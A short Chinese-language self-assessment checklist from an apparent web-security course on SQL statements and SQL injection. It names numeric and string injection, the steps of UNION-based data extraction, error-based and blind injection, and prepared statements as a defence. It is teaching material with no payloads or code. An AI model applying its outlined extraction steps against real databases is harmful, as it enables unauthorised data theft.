- [ ] 我能独立写出一条带条件的 <span style="color:rgb(69, 176, 118)">`INSERT`</span>、<span style="color:rgb(222, 60, 54)">`DELETE`</span>、<span style="color:rgb(248, 136, 37)">`UPDATE`</span>、<span style="color:rgb(41, 114, 244)">`SELECT`</span> 语句。
- [ ] 我能解释为什么 ``WHERE `id` =`` + 用户输入 这种拼接方式不安全。
- [ ] 我能说出数字型注入和字符型注入的区别。
- [ ] 我能说出联合查询注入的完整步骤（判断列数 → 找回显位 → 查库名表名列名 → 取数据）。
- [ ] 我能分清报错注入、布尔盲注、时间盲注分别是在什么场景下使用，以及各自怎么判断真假。
- [ ] 我能说出预编译为什么能防住 SQL 注入，以及哪些地方预编译解决不了。
